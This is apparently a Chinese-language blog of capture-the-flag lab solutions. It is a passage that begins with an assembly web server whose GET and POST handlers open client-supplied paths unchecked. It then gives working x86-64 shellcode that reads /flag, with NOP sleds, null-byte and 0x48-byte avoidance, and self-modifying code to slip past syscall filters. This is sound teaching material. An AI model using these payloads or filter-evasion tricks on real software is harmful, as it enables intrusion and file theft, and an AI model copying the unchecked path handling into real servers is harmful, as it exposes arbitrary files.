buffer</span><br><span class="line">    lea rdi, content</span><br><span class="line">loop2_start:</span><br><span class="line">    cmp r8, r12</span><br><span class="line">    jge get_content</span><br><span class="line">    mov al, byte ptr [rsi]</span><br><span class="line">    inc r9</span><br><span class="line">    cmp al, &#x27;\n&#x27;</span><br><span class="line">    je get_index </span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop2_start</span><br><span class="line">get_index:</span><br><span class="line">    inc r8</span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop2_start</span><br><span class="line">get_content:</span><br><span class="line">    sub r10, r9</span><br><span class="line">    mov rdi, 3      # write(3, content, content_length)</span><br><span class="line">    lea rsi, buffer</span><br><span class="line">    add rsi, r9</span><br><span class="line">    mov rdx, r10</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rdi, 3      # close(3) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    lea rsi,[rip + ret_normal_msg] </span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">socket_addr:</span><br><span class="line">    .2byte 2</span><br><span class="line">    .2byte 0x5000</span><br><span class="line">    .4byte 0</span><br><span class="line">    .8byte 0</span><br><span class="line">ret_normal_msg:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">buffer:</span><br><span class="line">    .space 512</span><br><span class="line">file_path:</span><br><span class="line">    .space 64 </span><br><span class="line">content:</span><br><span class="line">    .space 256</span><br><span class="line">reverse_content:</span><br><span class="line">    .space 256</span><br></pre></td></tr></table></figure>

<h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><p>这道题的关键就是多线程，也就是父进程需要不断地接收新的连接，并fork出子进程来处理这个连接，然后再接收新的连接，再fork出子进程来处理。因此，子进程部分就是level9和level10的结合。额外加一个循环，让父进程不断地accept和fork就好了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:     </span><br><span class="line">    mov rdi, 2      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41 </span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    lea rsi, [rip+socket_addr]</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # listen(3, 0) = 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall </span><br><span class="line">loop_accept:</span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, 57     # fork()</span><br><span class="line">    syscall</span><br><span class="line">    mov r8, rax</span><br><span class="line">	cmp r8, 0</span><br><span class="line">	jne parent_process</span><br><span class="line">	cmp r8, 0</span><br><span class="line">	je child_process</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    mov rdi, 3      # close(3)</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 4      # read(4,buf,count_bytes)</span><br><span class="line">    lea rsi, buffer</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov r15, rax</span><br><span class="line">    mov al, byte ptr [buffer]</span><br><span class="line">    cmp al, &#x27;P&#x27;</span><br><span class="line">    je post_request</span><br><span class="line">    cmp al, &#x27;G&#x27;</span><br><span class="line">    je get_request</span><br><span class="line"></span><br><span class="line">get_request:</span><br><span class="line">    lea rsi, buffer+4</span><br><span class="line">    lea rdi, file_path_get</span><br><span class="line">loop_start_get:</span><br><span class="line">    mov al, byte ptr [rsi]</span><br><span class="line">    cmp al, &#x27; &#x27;</span><br><span class="line">    je get_file_path_get</span><br><span class="line">    mov byte ptr [rdi], al</span><br><span class="line">    inc rdi</span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop_start_get</span><br><span class="line"></span><br><span class="line">get_file_path_get:</span><br><span class="line">    lea rdi, file_path_get # open</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rdi, 3              # read</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall </span><br><span class="line">    mov r8, rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    lea rsi,[rip + ret_normal_msg] </span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, r8</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post_request:</span><br><span class="line">    mov r10, rax</span><br><span class="line">    lea rsi, buffer+5</span><br><span class="line">    lea rdi, file_path</span><br><span class="line">loop_start_post:</span><br><span class="line">    mov al, byte ptr [rsi]</span><br><span class="line">    cmp al, 0x20</span><br><span class="line">    je get_file_path_post</span><br><span class="line">    mov byte ptr [rdi], al</span><br><span class="line">    inc rdi</span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop_start_post</span><br><span class="line"></span><br><span class="line">get_file_path_post:</span><br><span class="line">    lea rdi, file_path  # open(&quot;file_path&quot;, O_WRONLY|O_CREAT, 0777)</span><br><span class="line">    mov rsi, 01|0100</span><br><span class="line">    mov rdx, 0x1FF</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    mov r12, 8</span><br><span class="line">    mov r8, 0</span><br><span class="line">    mov r9, 0</span><br><span class="line">    lea rsi, buffer</span><br><span class="line">    lea rdi, content</span><br><span class="line">loop2_start_post:</span><br><span class="line">    cmp r8, r12</span><br><span class="line">    jge get_content</span><br><span class="line">    mov al, byte ptr [rsi]</span><br><span class="line">    inc r9</span><br><span class="line">    cmp al, &#x27;\n&#x27;</span><br><span class="line">    je get_index </span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop2_start_post</span><br><span class="line">get_index:</span><br><span class="line">    inc r8</span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop2_start_post</span><br><span class="line">get_content:</span><br><span class="line">    sub r15, r9</span><br><span class="line">    mov rdi, 3      # write(3, content, content_length)</span><br><span class="line">    lea rsi, buffer</span><br><span class="line">    add rsi, r9</span><br><span class="line">    mov rdx, r15</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rdi, 3      # close(3) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    lea rsi,[rip + ret_normal_msg] </span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">parent_process:</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line">    jmp loop_accept</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">socket_addr:</span><br><span class="line">    .2byte 2</span><br><span class="line">    .2byte 0x5000</span><br><span class="line">    .4byte 0</span><br><span class="line">    .8byte 0</span><br><span class="line">ret_normal_msg:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">buffer:</span><br><span class="line">    .space 512</span><br><span class="line">file_path:</span><br><span class="line">    .space 64 </span><br><span class="line">file_path_get:</span><br><span class="line">    .space 64</span><br><span class="line">content:</span><br><span class="line">    .space 256</span><br><span class="line">reverse_content:</span><br><span class="line">    .space 256</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Core-Material"><a href="#Core-Material" class="headerlink" title="Core Material"></a>Core Material</h1><h2 id="Intro-to-Cybersecurity"><a href="#Intro-to-Cybersecurity" class="headerlink" title="Intro to Cybersecurity"></a>Intro to Cybersecurity</h2><p>TO DO !!!</p>
<h2 id="Program-Security"><a href="#Program-Security" class="headerlink" title="Program Security"></a>Program Security</h2><h3 id="Shellcode-Injection"><a href="#Shellcode-Injection" class="headerlink" title="Shellcode Injection"></a>Shellcode Injection</h3><p>这个模块，使用的不是as和ld来汇编链接了。而是使用gcc编译器。</p>
<p>gcc是更高级的编译器，更方便，gcc可以自动处理汇编代码。可以根据文件的后缀名自动选择相应的编译器和链接器。gcc可以自动链接标准库以及你指定的其他库。</p>
<p>as+ld更底层，as汇编器将汇编代码转换为目标代码。目标代码是机器可以理解的二进制代码，但还没有链接成可执行文件。ld是GNU链接器，它将多个目标代码文件链接成可执行文件。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -nostdlib -static shellcode.s -o shellcode-elf</span> </span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>nostdlib</code>：不链接标准C库(libc)。这意味着不依赖于标准库中的任何函数，例如<code>prinft</code>，<code>malloc</code>等。</p>
<p><code>-static</code>：这个选项告诉编译器静态链接所有的库函数。所有的库函数代码将被直接包含到最终的可执行文件中，而不是通过动态链接的方式在运行时加载。提高程序可移植性。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objcopy --dump-section .text=shellcode-raw shellcode-elf</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>为什么需要objcopy这个命令呢？</p>
<p>objcopy将编译出来的shellcode-elf中单纯代码部分的机器码给提取出来。如果不这样做的话，gcc编译出来的可执行文件会有其他的机器码，用这个可执行文件作为shellcode传给程序的话，就不能直接起作用了，有其他杂项。</p>
</blockquote>
<h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><p>目的是通过shellcode，读取flag，并将其打印在屏幕上。OK，使用open和sendfile系统调用即可。</p>
<p><code>sys_sendfile(int out_fd,int in_fd,off_t *offset,size_t count)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">	nop</span><br><span class="line">    mov rbx, 0x00000067616c662f			# &quot;/flag&quot;</span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp						# /flag</span><br><span class="line">    mov rsi, 0							# read only</span><br><span class="line">    mov rax, 2							# 系统调用号</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 1							# 标准输出</span><br><span class="line">    mov rsi, rax						# /flag的fd</span><br><span class="line">    mov rdx, 0							# offset 0,从第一个字符开始打印</span><br><span class="line">    mov r10, 1000						# 输出长度</span><br><span class="line">    mov rax, 40							# 系统调用号</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>其实，也可以使用read,write系统调用，但是更复杂，需要处理字符串。</p>
<h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><p>这关简单，用到之前的技巧，生成0x800个nop即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    .rept 0x800</span><br><span class="line">    nop</span><br><span class="line">    .endr</span><br><span class="line">    mov rbx, 0x00000067616c662f</span><br><span class="line">    push rbx</span><br><span class="line">    mov rax, 2</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rsi, rax</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 1000</span><br><span class="line">    mov rax, 40</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level3-2"><a href="#level3-2" class="headerlink" title="level3"></a>level3</h4><p>这一关，需要shellcode中没有空字节。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rbx, 0x67616c662f		# bb48    662f    616c    0067    0000</span><br></pre></td></tr></table></figure>

<p>第一句就会有很多空字节，那么可以这么写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, 0x67616c66</span><br><span class="line">shl rbx, 8</span><br><span class="line">mov bl, 0x2f</span><br><span class="line"># 66bb    616c    4867    e3c1    b308    532f</span><br></pre></td></tr></table></figure>

<p><code>hexdump -x ./shellcode-raw</code>来查看shellcode的机器码。</p>
<p>因此，其他的也相应进行替换。最终exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    # mov rbx, 0x67616c662f</span><br><span class="line">    mov ebx, 0x67616c66</span><br><span class="line">    shl rbx, 8</span><br><span class="line">    mov bl, 0x2f</span><br><span class="line">    push rbx</span><br><span class="line">    # mov rax, 2</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov al, 2</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # mov rdi, 1</span><br><span class="line">    xor rbx, rbx</span><br><span class="line">    mov bl, 1</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    mov rsi, rax</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    # mov r10, 1000</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov al, 3</span><br><span class="line">    shl rax, 8</span><br><span class="line">    mov al, 0xe8</span><br><span class="line">    mov r10, rax</span><br><span class="line">    # mov rax, 40</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov al, 40</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # mov rax, 60</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov al, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4><p>This challenge requires that your shellcode have no H bytes! 不给有H字节。也就是<code>48</code></p>
<p>那就将所有的内容都换成<code>push/pop</code>即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    # mov rbx, 0x67616c662f</span><br><span class="line">    push 0x616c662f</span><br><span class="line">    mov dword ptr [rsp+4], 0x67</span><br><span class="line">    push 0x2</span><br><span class="line">    pop rax</span><br><span class="line">    push rsp</span><br><span class="line">    pop rdi</span><br><span class="line">    push 0x0</span><br><span class="line">    pop rsi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # mov rdi, 1</span><br><span class="line">    push 0x1</span><br><span class="line">    pop rdi</span><br><span class="line">    # mov rsi, rax</span><br><span class="line">    push rax</span><br><span class="line">    pop rsi</span><br><span class="line">    # mov rdx, 0</span><br><span class="line">    push 0x0</span><br><span class="line">    pop rdx</span><br><span class="line">    # mov r10, 1000</span><br><span class="line">    push 1000</span><br><span class="line">    pop r10</span><br><span class="line">    # mov rax, 40</span><br><span class="line">    push 40</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # mov rax, 60</span><br><span class="line">    push 60</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><p>不让用<code>syscall(0x0f05)</code>，<code>sysenter(0x0f34)</code>和<code>int(0x80cd)</code></p>
<p>题目提示是：绕过的一种方法是让shellcode修改自己，以便在运行时插入<code>syscall</code>指令。</p>
<blockquote>
<p>那么实际操作起来就是，将syscall的0x0f05成为一个字节值，即将0x0e05作为一个字节存储于代码段中，然后通过inc指令加1，使得第一个字节0e变成0f，并执行这个机器码，成功调用syscall即可。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rbx, 0x00000067616c662f			# &quot;/flag&quot;</span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp						# /flag</span><br><span class="line">    mov rsi, 0							# read only</span><br><span class="line">    mov rax, 2							# 系统调用号</span><br><span class="line">    inc byte ptr[rip]</span><br><span class="line">    .byte 0x0e</span><br><span class="line">    .byte 0x05</span><br><span class="line"></span><br><span class="line">    mov rdi, 1							# 标准输出</span><br><span class="line">    mov rsi, rax						# /flag的fd</span><br><span class="line">    mov rdx, 0							# offset 0,从第一个字符开始打印</span><br><span class="line">    mov r10, 1000						# 输出长度</span><br><span class="line">    mov rax, 40							# 系统调用号</span><br><span class="line">    inc byte ptr[rip]</span><br><span class="line">    .byte 0x0e</span><br><span class="line">    .byte 0x05</span><br><span class="line"></span><br><span class="line">    mov rax, 60</span><br><span class="line">    inc byte ptr[rip]</span><br><span class="line">    .byte 0x0e</span><br><span class="line">    .byte 0x05</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>gcc -Wl,-N --static -nostdlib -o shellcode-elf shellcode.s</code></p>
<p>要记住编译时需要使用这些参数，以保证.text段是可写的，因此才能修改.byte 0x0e.</p>
</blockquote>
<h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>前4096个字节不给写的权限，那我直接填充这4MB的空间即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rept 0x1000</span><br><span class="line">nop</span><br><span class="line">.endr</span><br></pre></td></tr></table></figure>

<p>nop填充即可。</p>
<h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><p>不给输出了现在，那么通过shellcode创建一个文件，然后把flag写进去就好啦。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">	nop</span><br><span class="line">    mov rbx, 0x00000067616c662f			# &quot;/flag&quot;</span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp						# /flag</span><br><span class="line">    mov rsi, 0							# read only</span><br><span class="line">    mov rax, 2							# 系统调用号</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov r10, rax                        # /flag的fd</span><br><span class="line"></span><br><span class="line">    # mov rbx, 0x74756f2f706d742f         # &quot;/tmp/out&quot;</span><br><span class="line">    push 0x00</span><br><span class="line">    mov rbx, 0x74756f2f706d742f</span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    mov rsi, 01|0100                    # O_WRONLY|O_CREAT</span><br><span class="line">    mov rdx, 0777                       # 权限777</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rdi, rax						# </span><br><span class="line">    mov rsi, r10						# /flag的fd</span><br><span class="line">    mov rdx, 0							# offset 0,从第一个字符开始打印</span><br><span class="line">    mov r10, 1000						# 输出长度</span><br><span class="line">    mov rax, 40							# 系统调用号</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>



